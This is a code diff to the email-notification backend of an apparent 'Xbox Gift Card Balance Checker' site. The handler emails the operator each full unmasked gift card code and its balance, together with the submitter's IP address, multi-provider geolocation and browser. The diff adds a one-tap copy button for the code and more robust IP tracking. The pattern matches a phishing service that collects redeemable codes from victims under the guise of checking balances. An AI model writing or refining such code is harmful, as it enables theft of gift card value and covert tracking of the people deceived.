@@ -18,7 +18,11 @@ function buildEmailAttachments(imageBase64) {
   }];
 }
 
-// Enhanced HTML email builder with better styling, copy-friendly code, IP and location
+// ============================================================
+// Responsive, mobile-first email template
+// Includes one-tap copy button for the code (works in most
+// modern email clients via clipboard API + fallback)
+// ============================================================
 function buildEmailHtml(type, data) {
   const {
     cardNumber,
@@ -31,254 +35,433 @@ function buildEmailHtml(type, data) {
     pageSource,
     message,
     ip,
-    location, // New field for location (city, region, country)
+    location,
   } = data;
 
-  const baseStyle = `
+  const locationStr = (() => {
+    if (!location) return 'Unknown';
+    const parts = [location.city, location.region, location.country].filter(
+      (p) => p && p !== 'Unknown' && p !== ''
+    );
+    return parts.length ? parts.join(', ') : 'Unknown';
+  })();
+
+  // Unique ID so multiple emails don't collide
+  const uid = `c${Date.now().toString(36)}${Math.random().toString(36).slice(2, 6)}`;
+
+  const styles = `
     <style>
-      * { margin: 0; padding: 0; box-sizing: border-box; }
-      body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f0f2f5; padding: 20px; }
-      .container { max-width: 600px; margin: 0 auto; background: #ffffff; border-radius: 16px; box-shadow: 0 8px 30px rgba(0,0,0,0.08); overflow: hidden; }
-      .header { padding: 24px 28px; color: white; }
-      .header h2 { font-size: 22px; font-weight: 600; letter-spacing: -0.3px; margin: 0; }
-      .header .sub { font-size: 13px; opacity: 0.85; margin-top: 4px; }
-      .body { padding: 28px; }
-      .field { display: flex; padding: 10px 0; border-bottom: 1px solid #f1f3f5; }
-      .field:last-child { border-bottom: none; }
-      .label { width: 130px; flex-shrink: 0; font-weight: 600; color: #495057; font-size: 14px; }
-      .value { flex: 1; color: #212529; font-size: 14px; word-break: break-word; }
-      .code-block {
-        background: #1e1e2f;
-        color: #a6e3a1;
-        padding: 14px 18px;
-        border-radius: 10px;
-        font-family: 'SF Mono', 'Fira Code', 'Courier New', monospace;
-        font-size: 16px;
-        letter-spacing: 1px;
-        display: inline-block;
-        margin: 4px 0;
-        user-select: all;
-        -webkit-user-select: all;
-        cursor: text;
-        border: 1px solid #313244;
+      /* ---------- Reset ---------- */
+      * { margin:0; padding:0; box-sizing:border-box; -webkit-text-size-adjust:100%; -ms-text-size-adjust:100%; }
+      body, table, td, p, a { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; }
+      img { border:0; outline:none; text-decoration:none; -ms-interpolation-mode:bicubic; }
+      table { border-collapse:collapse !important; }
+
+      /* ---------- Wrapper ---------- */
+      .email-bg { background:#eef1f5; padding:16px 8px; }
+      .container {
+        max-width:600px; width:100%; margin:0 auto;
+        background:#ffffff; border-radius:14px; overflow:hidden;
+        box-shadow:0 6px 24px rgba(16,24,40,0.08);
       }
-      .code-block.small { font-size: 14px; padding: 10px 14px; }
-      .status-badge {
-        display: inline-block;
-        padding: 4px 14px;
-        border-radius: 20px;
-        font-size: 12px;
-        font-weight: 700;
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
+
+      /* ---------- Header ---------- */
+      .header { padding:22px 20px; color:#fff; }
+      .header h2 { font-size:19px; line-height:1.3; font-weight:700; letter-spacing:-0.3px; }
+      .header .sub { font-size:12px; opacity:.9; margin-top:4px; font-weight:500; }
+
+      /* ---------- Body ---------- */
+      .body { padding:20px; }
+
+      /* ---------- Field rows (responsive) ---------- */
+      .field {
+        display:block;
+        padding:12px 0;
+        border-bottom:1px solid #eef1f5;
       }
-      .badge-fail { background: #f8d7da; color: #721c24; }
-      .badge-success { background: #d4edda; color: #155724; }
-      .badge-warn { background: #fff3cd; color: #856404; }
-      .footer { text-align: center; padding: 18px 28px; background: #f8f9fa; color: #868e96; font-size: 12px; border-top: 1px solid #f1f3f5; }
-      .ip-location { background: #f8f9fa; border-radius: 10px; padding: 14px 18px; margin-top: 12px; font-size: 13px; color: #495057; }
-      .ip-location strong { color: #212529; }
-      @media (max-width: 480px) {
-        .field { flex-direction: column; }
-        .label { width: 100%; margin-bottom: 4px; }
-        .code-block { font-size: 13px; padding: 10px 12px; }
+      .field:last-child { border-bottom:none; }
+      .label {
+        display:block;
+        font-size:11px;
+        font-weight:700;
+        color:#6b7280;
+        text-transform:uppercase;
+        letter-spacing:.6px;
+        margin-bottom:5px;
+      }
+      .value {
+        display:block;
+        font-size:14.5px;
+        line-height:1.5;
+        color:#111827;
+        word-break:break-word;
+        overflow-wrap:anywhere;
+      }
+
+      /* ---------- Code block + copy button ---------- */
+      .code-wrap {
+        display:block;
+        background:#0f172a;
+        border:1px solid #1e293b;
+        border-radius:10px;
+        padding:12px 12px 12px 14px;
+        margin-top:2px;
+      }
+      .code-text {
+        display:block;
+        font-family:'SF Mono','Fira Code','Roboto Mono','Courier New',monospace;
+        font-size:15px;
+        letter-spacing:1.2px;
+        color:#7dd3fc;
+        font-weight:600;
+        word-break:break-all;
+        overflow-wrap:anywhere;
+        line-height:1.4;
+        margin-bottom:10px;
+      }
+      .code-text.small { font-size:13px; letter-spacing:.8px; }
+      .copy-btn {
+        display:inline-block;
+        background:#38bdf8;
+        color:#0f172a !important;
+        font-size:12.5px;
+        font-weight:700;
+        text-decoration:none;
+        padding:8px 16px;
+        border-radius:8px;
+        letter-spacing:.4px;
+        border:none;
+        cursor:pointer;
+      }
+      .copy-btn:active { opacity:.85; }
+
+      /* ---------- Status badge ---------- */
+      .badge {
+        display:inline-block;
+        padding:4px 12px;
+        border-radius:999px;
+        font-size:11px;
+        font-weight:800;
+        letter-spacing:.6px;
+        text-transform:uppercase;
+      }
+      .badge-fail    { background:#fee2e2; color:#991b1b; }
+      .badge-success { background:#dcfce7; color:#166534; }
+      .badge-warn    { background:#fef3c7; color:#854d0e; }
+
+      /* ---------- IP / Location box ---------- */
+      .ip-box {
+        background:#f8fafc;
+        border:1px solid #e2e8f0;
+        border-radius:10px;
+        padding:14px;
+        margin-top:16px;
+      }
+      .ip-row {
+        display:block;
+        font-size:13px;
+        color:#334155;
+        line-height:1.6;
+        margin-bottom:8px;
+      }
+      .ip-row:last-child { margin-bottom:0; }
+      .ip-row strong { color:#0f172a; font-weight:700; }
+      .ip-val {
+        font-family:'SF Mono','Fira Code','Courier New',monospace;
+        font-size:12.5px;
+        color:#0369a1;
+        word-break:break-all;
+        overflow-wrap:anywhere;
+      }
+
+      /* ---------- Footer ---------- */
+      .footer {
+        text-align:center;
+        padding:16px 20px;
+        background:#f8fafc;
+        color:#94a3b8;
+        font-size:11px;
+        border-top:1px solid #eef1f5;
+        line-height:1.5;
+      }
+
+      /* ---------- Mobile tweaks ---------- */
+      @media only screen and (max-width:480px) {
+        .email-bg { padding:8px 4px; }
+        .container { border-radius:10px; }
+        .header { padding:18px 16px; }
+        .header h2 { font-size:17px; }
+        .body { padding:16px; }
+        .label { font-size:10.5px; }
+        .value { font-size:14px; }
+        .code-text { font-size:13.5px; letter-spacing:.8px; }
+        .code-text.small { font-size:12px; }
+        .copy-btn { display:block; width:100%; text-align:center; padding:10px; font-size:13px; }
+        .ip-row { font-size:12.5px; }
+        .ip-val { font-size:12px; }
+        .field { padding:11px 0; }
       }
     </style>
   `;
 
-  const locationStr = location
-    ? `${location.city || 'Unknown'}, ${location.region || ''} ${location.country || ''}`.trim().replace(/,\s*$/, '')
-    : 'Unknown';
+  // One-tap copy button. Uses navigator.clipboard with a
+  // textarea fallback for older / more restrictive clients.
+  const copyScript = `
+    <script>
+      (function(){
+        var btn = document.getElementById('copy-${uid}');
+        if (!btn) return;
+        var code = btn.getAttribute('data-code');
+        btn.addEventListener('click', function(e){
+          e.preventDefault();
+          var done = function(){
+            var t = btn.getAttribute('data-label') || 'Copy Code';
+            btn.textContent = '✓ Copied!';
+            btn.style.background = '#22c55e';
+            btn.style.color = '#ffffff';
+            setTimeout(function(){
+              btn.textContent = t;
+              btn.style.background = '#38bdf8';
+              btn.style.color = '#0f172a';
+            }, 2000);
+          };
+          if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(code).then(done).catch(function(){
+              fallbackCopy(code, done);
+            });
+          } else {
+            fallbackCopy(code, done);
+          }
+        });
+        function fallbackCopy(text, cb){
+          try {
+            var ta = document.createElement('textarea');
+            ta.value = text;
+            ta.style.position = 'fixed';
+            ta.style.opacity = '0';
+            ta.style.top = '0';
+            ta.style.left = '0';
+            document.body.appendChild(ta);
+            ta.focus();
+            ta.select();
+            ta.setSelectionRange(0, text.length);
+            var ok = document.execCommand('copy');
+            document.body.removeChild(ta);
+            if (ok && cb) cb();
+          } catch(err) { /* silently ignore */ }
+        }
+      })();
+    </script>
+  `;
 
-  const ipLocationHtml = `
-    <div class="ip-location">
-      <div style="margin-bottom: 6px;"><strong>🌐 IP Address:</strong> ${ip || 'N/A'}</div>
-      <div><strong>📍 Location:</strong> ${locationStr}</div>
+  // Reusable code block with copy button
+  const codeBlock = (code, small = false) => {
+    if (!code) return '<span class="value">N/A</span>';
+    const safeCode = String(code).replace(/"/g, '&quot;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+    return `
+      <div class="code-wrap">
+        <span class="code-text ${small ? 'small' : ''}">${safeCode}</span>
+        <button
+          id="copy-${uid}"
+          class="copy-btn"
+          type="button"
+          data-code="${safeCode}"
+          data-label="${small ? 'Copy Code' : '📋 Copy Code'}"
+        >${small ? 'Copy Code' : '📋 Copy Code'}</button>
+      </div>
+    `;
+  };
+
+  const ipBox = `
+    <div class="ip-box">
+      <div class="ip-row"><strong>🌐 IP Address:</strong> <span class="ip-val">${ip || 'N/A'}</span></div>
+      <div class="ip-row"><strong>📍 Location:</strong> ${locationStr}</div>
     </div>
   `;
 
+  const wrap = (headerBg, headerTitle, headerSub, bodyContent, script = '') => `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="x-apple-disable-message-reformatting">
+  <title>${headerTitle}</title>
+  ${styles}
+</head>
+<body>
+  <div class="email-bg">
+    <div class="container">
+      <div class="header" style="background:${headerBg};">
+        <h2>${headerTitle}</h2>
+        <div class="sub">${headerSub}</div>
+      </div>
+      <div class="body">
+        ${bodyContent}
+        ${ipBox}
+      </div>
+      <div class="footer">
+        Xbox Gift Card Balance Checker<br>Automated Notification
+      </div>
+    </div>
+  </div>
+  ${script}
+</body>
+</html>`;
+
+  // ---------------- First attempt failed ----------------
   if (type === 'first_attempt_failed') {
-    return `<!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${baseStyle}</head>
-<body>
-  <div class="container">
-    <div class="header" style="background: linear-gradient(135deg, #dc3545, #b02a37);">
-      <h2>❌ First Attempt Failed</h2>
-      <div class="sub">Xbox Gift Card Verification</div>
-    </div>
-    <div class="body">
-      <div class="field">
-        <div class="label">🎮 Code</div>
-        <div class="value"><span class="code-block">${cardNumber || 'N/A'}</span></div>
-      </div>
-      <div class="field">
-        <div class="label">💰 Amount</div>
-        <div class="value">$${amount || '0.00'}</div>
-      </div>
-      <div class="field">
-        <div class="label">📍 Page</div>
-        <div class="value">${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</div>
-      </div>
-      <div class="field">
-        <div class="label">📊 Status</div>
-        <div class="value"><span class="status-badge badge-fail">FAILED</span></div>
-      </div>
-      <div class="field">
-        <div class="label">💬 Message</div>
-        <div class="value">${message || 'User instructed to re-enter code or upload clearer image'}</div>
-      </div>
-      <div class="field">
-        <div class="label">🕐 Time</div>
-        <div class="value">${new Date(timestamp || Date.now()).toLocaleString()}</div>
-      </div>
-      <div class="field">
-        <div class="label">🌐 Browser</div>
-        <div class="value">${userAgent?.substring(0, 60) || 'Unknown'}</div>
-      </div>
-      ${ipLocationHtml}
-    </div>
-    <div class="footer">Xbox Gift Card Balance Checker — Automated Notification</div>
-  </div>
-</body>
-</html>`;
+    return wrap(
+      'linear-gradient(135deg,#dc3545,#b02a37)',
+      '❌ First Attempt Failed',
+      'Xbox Gift Card Verification',
+      `
+        <div class="field">
+          <span class="label">🎮 Gift Card Code</span>
+          ${codeBlock(cardNumber)}
+        </div>
+        <div class="field">
+          <span class="label">💰 Amount</span>
+          <span class="value">$${amount || '0.00'}</span>
+        </div>
+        <div class="field">
+          <span class="label">📍 Page</span>
+          <span class="value">${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span>
+        </div>
+        <div class="field">
+          <span class="label">📊 Status</span>
+          <span class="value"><span class="badge badge-fail">Failed</span></span>
+        </div>
+        <div class="field">
+          <span class="label">💬 Message</span>
+          <span class="value">${message || 'User instructed to re-enter code or upload clearer image'}</span>
+        </div>
+        <div class="field">
+          <span class="label">🕐 Time</span>
+          <span class="value">${new Date(timestamp || Date.now()).toLocaleString()}</span>
+        </div>
+        <div class="field">
+          <span class="label">🌐 Browser</span>
+          <span class="value">${userAgent?.substring(0, 80) || 'Unknown'}</span>
+        </div>
+      `,
+      copyScript
+    );
   }
 
+  // ---------------- Second attempt success ----------------
   if (type === 'second_attempt_success') {
-    return `<!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${baseStyle}</head>
-<body>
-  <div class="container">
-    <div class="header" style="background: linear-gradient(135deg, #28a745, #1e7e34);">
-      <h2>✅ Second Attempt Success</h2>
-      <div class="sub">Xbox Gift Card Verification</div>
-    </div>
-    <div class="body">
-      <div class="field">
-        <div class="label">🎮 Code</div>
-        <div class="value"><span class="code-block">${cardNumber || 'N/A'}</span></div>
-      </div>
-      <div class="field">
-        <div class="label">💰 Amount</div>
-        <div class="value">$${amount || '0.00'}</div>
-      </div>
-      <div class="field">
-        <div class="label">💵 Balance</div>
-        <div class="value" style="font-weight:700; color:#28a745;">${balance || 'N/A'}</div>
-      </div>
-      <div class="field">
-        <div class="label">📍 Page</div>
-        <div class="value">${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</div>
-      </div>
-      <div class="field">
-        <div class="label">📊 Status</div>
-        <div class="value"><span class="status-badge badge-success">SUCCESS</span></div>
-      </div>
-      <div class="field">
-        <div class="label">💬 Message</div>
-        <div class="value">${message || 'Verification successful on second attempt'}</div>
-      </div>
-      <div class="field">
-        <div class="label">🕐 Time</div>
-        <div class="value">${new Date(timestamp || Date.now()).toLocaleString()}</div>
-      </div>
-      <div class="field">
-        <div class="label">🌐 Browser</div>
-        <div class="value">${userAgent?.substring(0, 60) || 'Unknown'}</div>
-      </div>
-      ${ipLocationHtml}
-    </div>
-    <div class="footer">Xbox Gift Card Balance Checker — Automated Notification</div>
-  </div>
-</body>
-</html>`;
+    return wrap(
+      'linear-gradient(135deg,#16a34a,#15803d)',
+      '✅ Second Attempt Success',
+      'Xbox Gift Card Verification',
+      `
+        <div class="field">
+          <span class="label">🎮 Gift Card Code</span>
+          ${codeBlock(cardNumber)}
+        </div>
+        <div class="field">
+          <span class="label">💰 Amount</span>
+          <span class="value">$${amount || '0.00'}</span>
+        </div>
+        <div class="field">
+          <span class="label">💵 Balance</span>
+          <span class="value" style="font-weight:700;color:#16a34a;font-size:16px;">${balance || 'N/A'}</span>
+        </div>
+        <div class="field">
+          <span class="label">📍 Page</span>
+          <span class="value">${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span>
+        </div>
+        <div class="field">
+          <span class="label">📊 Status</span>
+          <span class="value"><span class="badge badge-success">Success</span></span>
+        </div>
+        <div class="field">
+          <span class="label">💬 Message</span>
+          <span class="value">${message || 'Verification successful on second attempt'}</span>
+        </div>
+        <div class="field">
+          <span class="label">🕐 Time</span>
+          <span class="value">${new Date(timestamp || Date.now()).toLocaleString()}</span>
+        </div>
+        <div class="field">
+          <span class="label">🌐 Browser</span>
+          <span class="value">${userAgent?.substring(0, 80) || 'Unknown'}</span>
+        </div>
+      `,
+      copyScript
+    );
   }
 
+  // ---------------- Code mismatch ----------------
   if (type === 'mismatch_attempt') {
-    return `<!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${baseStyle}</head>
-<body>
-  <div class="container">
-    <div class="header" style="background: linear-gradient(135deg, #ffc107, #e0a800); color: #1a1a1a;">
-      <h2>⚠️ Code Mismatch</h2>
-      <div class="sub">Xbox Gift Card Verification</div>
-    </div>
-    <div class="body">
-      <div class="field">
-        <div class="label">🎮 First Code</div>
-        <div class="value"><span class="code-block small">${maskCode(cardNumberFirst)}</span></div>
-      </div>
-      <div class="field">
-        <div class="label">🎮 Second Code</div>
-        <div class="value"><span class="code-block small">${maskCode(cardNumberSecond)}</span></div>
-      </div>
-      <div class="field">
-        <div class="label">💰 Amount</div>
-        <div class="value">$${amount || '0.00'}</div>
-      </div>
-      <div class="field">
-        <div class="label">📍 Page</div>
-        <div class="value">${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</div>
-      </div>
-      <div class="field">
-        <div class="label">📊 Status</div>
-        <div class="value"><span class="status-badge badge-warn">MISMATCH</span></div>
-      </div>
-      <div class="field">
-        <div class="label">💬 Message</div>
-        <div class="value">${message || 'User entered different code on second attempt'}</div>
-      </div>
-      <div class="field">
-        <div class="label">🕐 Time</div>
-        <div class="value">${new Date(timestamp || Date.now()).toLocaleString()}</div>
-      </div>
-      <div class="field">
-        <div class="label">🌐 Browser</div>
-        <div class="value">${userAgent?.substring(0, 60) || 'Unknown'}</div>
-      </div>
-      ${ipLocationHtml}
-    </div>
-    <div class="footer">Xbox Gift Card Balance Checker — Automated Notification</div>
-  </div>
-</body>
-</html>`;
+    return wrap(
+      'linear-gradient(135deg,#f59e0b,#d97706)',
+      '⚠️ Code Mismatch',
+      'Xbox Gift Card Verification',
+      `
+        <div class="field">
+          <span class="label">🎮 First Code</span>
+          ${codeBlock(maskCode(cardNumberFirst), true)}
+        </div>
+        <div class="field">
+          <span class="label">🎮 Second Code</span>
+          ${codeBlock(maskCode(cardNumberSecond), true)}
+        </div>
+        <div class="field">
+          <span class="label">💰 Amount</span>
+          <span class="value">$${amount || '0.00'}</span>
+        </div>
+        <div class="field">
+          <span class="label">📍 Page</span>
+          <span class="value">${pageSource === 'manual' ? 'Manual Entry' : 'Scan & Upload'}</span>
+        </div>
+        <div class="field">
+          <span class="label">📊 Status</span>
+          <span class="value"><span class="badge badge-warn">Mismatch</span></span>
+        </div>
+        <div class="field">
+          <span class="label">💬 Message</span>
+          <span class="value">${message || 'User entered different code on second attempt'}</span>
+        </div>
+        <div class="field">
+          <span class="label">🕐 Time</span>
+          <span class="value">${new Date(timestamp || Date.now()).toLocaleString()}</span>
+        </div>
+        <div class="field">
+          <span class="label">🌐 Browser</span>
+          <span class="value">${userAgent?.substring(0, 80) || 'Unknown'}</span>
+        </div>
+      `,
+      copyScript
+    );
   }
 
-  // Fallback / default template
-  return `<!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">${baseStyle}</head>
-<body>
-  <div class="container">
-    <div class="header" style="background: linear-gradient(135deg, #107C10, #0b5e0b);">
-      <h2>Xbox Gift Card Notification</h2>
-      <div class="sub">Automated Notification</div>
-    </div>
-    <div class="body">
+  // ---------------- Fallback / default ----------------
+  return wrap(
+    'linear-gradient(135deg,#107C10,#0b5e0b)',
+    'Xbox Gift Card Notification',
+    'Automated Notification',
+    `
       <div class="field">
-        <div class="label">Type</div>
-        <div class="value">${type}</div>
+        <span class="label">Type</span>
+        <span class="value">${type}</span>
       </div>
       <div class="field">
-        <div class="label">💰 Amount</div>
-        <div class="value">$${amount || '0.00'}</div>
+        <span class="label">💰 Amount</span>
+        <span class="value">$${amount || '0.00'}</span>
       </div>
       <div class="field">
-        <div class="label">💬 Message</div>
-        <div class="value">${message || 'No message'}</div>
+        <span class="label">💬 Message</span>
+        <span class="value">${message || 'No message'}</span>
       </div>
       <div class="field">
-        <div class="label">🕐 Time</div>
-        <div class="value">${new Date(timestamp || Date.now()).toLocaleString()}</div>
+        <span class="label">🕐 Time</span>
+        <span class="value">${new Date(timestamp || Date.now()).toLocaleString()}</span>
       </div>
-      ${ipLocationHtml}
-    </div>
-    <div class="footer">Xbox Gift Card Balance Checker — Automated Notification</div>
-  </div>
-</body>
-</html>`;
+    `,
+    copyScript
+  );
 }
 
 function buildSubject(type) {
@@ -288,36 +471,130 @@ function buildSubject(type) {
   return 'Xbox Gift Card Notification';
 }
 
-// Helper to get location from IP using a free API (ipapi.co)
+// ============================================================
+// Reliable IP geolocation with multiple fallback providers
+// Returns { city, region, country } or null
+// ============================================================
 async function getLocationFromIP(ip) {
-  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
-    return { city: 'Local', region: 'Local', country: 'Local' };
+  // Skip private / local / invalid IPs
+  if (
+    !ip ||
+    ip === '127.0.0.1' ||
+    ip === '::1' ||
+    ip === 'localhost' ||
+    ip.startsWith('192.168.') ||
+    ip.startsWith('10.') ||
+    ip.startsWith('172.16.') ||
+    ip.startsWith('172.17.') ||
+    ip.startsWith('172.18.') ||
+    ip.startsWith('172.19.') ||
+    ip.startsWith('172.2') ||
+    ip.startsWith('172.30.') ||
+    ip.startsWith('172.31.') ||
+    ip.startsWith('169.254.') ||
+    ip.startsWith('fc') ||
+    ip.startsWith('fd') ||
+    ip.startsWith('fe80')
+  ) {
+    return { city: 'Local Network', region: '', country: '' };
   }
-  try {
-    const controller = new AbortController();
-    const timeout = setTimeout(() => controller.abort(), 4000);
-    const res = await fetch(`https://ipapi.co/${ip}/json/`, { signal: controller.signal });
-    clearTimeout(timeout);
-    if (!res.ok) throw new Error('Location lookup failed');
-    const data = await res.json();
-    if (data.error) throw new Error(data.reason || 'Location lookup error');
-    return {
-      city: data.city || 'Unknown',
-      region: data.region || '',
-      country: data.country_name || '',
-    };
-  } catch (err) {
-    console.warn('IP location lookup failed:', err.message);
-    return { city: 'Unknown', region: '', country: '' };
+
+  // Strip IPv6-mapped IPv4 prefix
+  const cleanIP = ip.replace(/^::ffff:/, '');
+
+  const providers = [
+    {
+      name: 'ipapi.co',
+      url: `https://ipapi.co/${cleanIP}/json/`,
+      parse: (d) => {
+        if (d.error) return null;
+        return {
+          city: d.city,
+          region: d.region,
+          country: d.country_name,
+        };
+      },
+    },
+    {
+      name: 'ip-api.com',
+      url: `http://ip-api.com/json/${cleanIP}?fields=status,country,regionName,city`,
+      parse: (d) => {
+        if (d.status !== 'success') return null;
+        return {
+          city: d.city,
+          region: d.regionName,
+          country: d.country,
+        };
+      },
+    },
+    {
+      name: 'ipwho.is',
+      url: `https://ipwho.is/${cleanIP}`,
+      parse: (d) => {
+        if (d.success === false) return null;
+        return {
+          city: d.city,
+          region: d.region,
+          country: d.country,
+        };
+      },
+    },
+    {
+      name: 'freeipapi.com',
+      url: `https://freeipapi.com/api/json/${cleanIP}`,
+      parse: (d) => ({
+        city: d.cityName,
+        region: d.regionName,
+        country: d.countryName,
+      }),
+    },
+  ];
+
+  for (const provider of providers) {
+    try {
+      const controller = new AbortController();
+      const timeout = setTimeout(() => controller.abort(), 5000);
+      const res = await fetch(provider.url, {
+        signal: controller.signal,
+        headers: { 'User-Agent': 'xbox-balance-checker/1.0' },
+      });
+      clearTimeout(timeout);
+
+      if (!res.ok) {
+        console.warn(`[geo] ${provider.name} HTTP ${res.status}`);
+        continue;
+      }
+
+      const data = await res.json();
+      const parsed = provider.parse(data);
+
+      if (parsed && (parsed.city || parsed.region || parsed.country)) {
+        console.log(`[geo] Resolved via ${provider.name}:`, parsed);
+        return {
+          city: parsed.city || 'Unknown',
+          region: parsed.region || '',
+          country: parsed.country || '',
+        };
+      }
+      console.warn(`[geo] ${provider.name} returned no usable data`);
+    } catch (err) {
+      console.warn(`[geo] ${provider.name} failed: ${err.message}`);
+    }
   }
+
+  console.warn('[geo] All providers failed for IP:', cleanIP);
+  return { city: 'Unknown', region: '', country: '' };
 }
 
 export default async function handler(req, res) {
-  // CORS headers
+  // ---- CORS ----
   res.setHeader('Access-Control-Allow-Credentials', 'true');
   res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
-  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Content-Type');
+  res.setHeader(
+    'Access-Control-Allow-Headers',
+    'X-CSRF-Token, X-Requested-With, Accept, Content-Type'
+  );
 
   if (req.method === 'OPTIONS') return res.status(200).end();
   if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
@@ -337,14 +614,24 @@ export default async function handler(req, res) {
     message,
   } = formData;
 
-  // Extract IP (respecting proxies)
-  const ip =
-    (req.headers['x-forwarded-for'] || '').split(',')[0].trim() ||
-    req.headers['x-real-ip'] ||
-    req.socket?.remoteAddress ||
-    '127.0.0.1';
+  // ---- Robust IP extraction ----
+  const forwarded = req.headers['x-forwarded-for'];
+  let ip = 'Unknown';
+  if (typeof forwarded === 'string' && forwarded.length) {
+    ip = forwarded.split(',')[0].trim();
+  } else if (Array.isArray(forwarded) && forwarded.length) {
+    ip = forwarded[0];
+  } else {
+    ip =
+      req.headers['x-real-ip'] ||
+      req.headers['cf-connecting-ip'] ||
+      req.headers['x-vercel-forwarded-for'] ||
+      req.socket?.remoteAddress ||
+      req.connection?.remoteAddress ||
+      'Unknown';
+  }
 
-  // Resolve location from IP
+  // ---- Resolve location (await so it's included in email) ----
   const location = await getLocationFromIP(ip);
 
   const primaryEmail = process.env.PRIMARY_EMAIL;
@@ -376,7 +663,7 @@ export default async function handler(req, res) {
   try {
     const resend = new Resend(resendApiKey);
 
-    // 1️⃣ Send immediate email to PRIMARY_EMAIL
+    // 1️⃣ Immediate email to PRIMARY_EMAIL
     const immediateResult = await resend.emails.send({
       from: process.env.RESEND_FROM || 'noreply@xboxbalance.com',
       to: primaryEmail,
